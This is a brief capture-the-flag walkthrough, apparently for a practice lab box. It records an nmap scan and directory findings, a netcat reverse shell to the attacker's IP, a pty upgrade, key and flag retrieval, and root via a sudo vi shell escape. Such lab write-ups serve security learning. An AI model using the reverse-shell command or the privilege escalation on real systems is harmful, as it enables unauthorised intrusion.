# nmap

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-04 01:39 EDT
Nmap scan report for 10.10.101.154
Host is up (0.096s latency).
Not shown: 989 closed tcp ports (reset)
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 3.0.3
22/tcp  open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http       Apache httpd 2.4.29 ((Ubuntu))
100/tcp open  newacct?
106/tcp open  pop3pw?
109/tcp open  pop2?
110/tcp open  pop3?
111/tcp open  rpcbind?
113/tcp open  ident?
119/tcp open  nntp?
125/tcp open  locus-map?
```

# dirsearch

found index.php.bak and found home.php

# getting a rev shell

home.php has a command execution page

maybe a revshell like that?

got a rev shell with busybox `nc 10.6.22.229 6969 -e /bin/sh`

# finding key

getting a pty with `python -c'import pty; pty.spawn("/bin/bash")'`

i found the key in key_rev_key, just run `strings key_rev_key` and the base64 string is the key `VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=`

# user.txt

witb my revshell i found the private key in `teleport` and i sshed using it, and i got the user flag like that

# charlies password

in validate.php, charlies password was there.

# root.txt

gtfobins suggested `sudo vi -c ':!/bin/sh' /dev/null` which gave me root, and then to get the root flag i ran `python root.py` and entered the key before

